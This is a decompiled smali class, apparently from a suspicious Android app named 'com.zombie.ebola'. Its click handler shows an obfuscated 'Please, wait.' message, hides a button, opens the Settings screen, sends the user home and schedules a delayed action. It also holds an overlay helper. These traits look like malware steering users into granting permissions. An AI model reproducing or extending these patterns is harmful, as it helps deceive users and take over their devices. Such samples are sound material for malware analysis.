.class Lcom/zombie/ebola/v;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field final synthetic a:Lcom/zombie/ebola/u;

.field private final synthetic b:Landroid/view/View;

.field private final synthetic c:Landroid/widget/TextView;

.field private final synthetic d:Landroid/widget/Button;


# direct methods
.method constructor <init>(Lcom/zombie/ebola/u;Landroid/view/View;Landroid/widget/TextView;Landroid/widget/Button;)V
    .locals 0

    iput-object p1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    iput-object p2, p0, Lcom/zombie/ebola/v;->b:Landroid/view/View;

    iput-object p3, p0, Lcom/zombie/ebola/v;->c:Landroid/widget/TextView;

    iput-object p4, p0, Lcom/zombie/ebola/v;->d:Landroid/widget/Button;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private a()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v1}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v1

    invoke-virtual {v1}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {p0}, Lcom/zombie/ebola/v;->b()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    const/high16 v2, 0x4000000

    invoke-static {v1, v0, v2}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    const/high16 v2, 0x40000000    # 2.0f

    invoke-static {v1, v0, v2}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    const/high16 v2, 0x10000000

    invoke-static {v1, v0, v2}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v1, v0}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;Landroid/content/Intent;)V

    return-void
.end method

.method private a(Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V
    .locals 0

    invoke-interface {p1, p2, p3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method

.method private a(Landroid/widget/Button;I)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/widget/Button;->setVisibility(I)V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/v;)V
    .locals 0

    invoke-direct {p0}, Lcom/zombie/ebola/v;->c()V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/v;Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V
    .locals 0

    invoke-direct {p0, p1, p2, p3}, Lcom/zombie/ebola/v;->a(Landroid/view/WindowManager;Landroid/view/View;Landroid/view/WindowManager$LayoutParams;)V

    return-void
.end method

.method private b()Ljava/lang/Class;
    .locals 1

    const-class v0, Lcom/zombie/ebola/csero;

    return-object v0
.end method

.method static synthetic b(Lcom/zombie/ebola/v;)V
    .locals 0

    invoke-direct {p0}, Lcom/zombie/ebola/v;->a()V

    return-void
.end method

.method static synthetic c(Lcom/zombie/ebola/v;)Lcom/zombie/ebola/u;
    .locals 1

    iget-object v0, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    return-object v0
.end method

.method private c()V
    .locals 4

    const/high16 v3, 0x10000000

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    const/high16 v2, 0x40000000    # 2.0f

    invoke-static {v1, v0, v2}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v1, v0, v3}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v1}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/zombie/ebola/zero;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v1}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/zombie/ebola/zero;->startActivity(Landroid/content/Intent;)V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5

    iget-object v0, p0, Lcom/zombie/ebola/v;->b:Landroid/view/View;

    iget-object v1, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v1}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v1

    invoke-virtual {v1}, Lcom/zombie/ebola/zero;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "Howar"

    const-string v3, "id"

    iget-object v4, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v4}, Lcom/zombie/ebola/u;->b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;

    move-result-object v4

    invoke-virtual {v4}, Lcom/zombie/ebola/zero;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/LinearLayout;

    iget-object v1, p0, Lcom/zombie/ebola/v;->c:Landroid/widget/TextView;

    const-string v2, "      Pl"

    const-string v3, "ease, wait.      \n"

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setVisibility(I)V

    iget-object v0, p0, Lcom/zombie/ebola/v;->d:Landroid/widget/Button;

    const/16 v1, 0x8

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/v;->a(Landroid/widget/Button;I)V

    iget-object v0, p0, Lcom/zombie/ebola/v;->a:Lcom/zombie/ebola/u;

    invoke-static {v0}, Lcom/zombie/ebola/u;->a(Lcom/zombie/ebola/u;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/zombie/ebola/w;

    invoke-direct {v1, p0, v0}, Lcom/zombie/ebola/w;-><init>(Lcom/zombie/ebola/v;Landroid/os/Handler;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
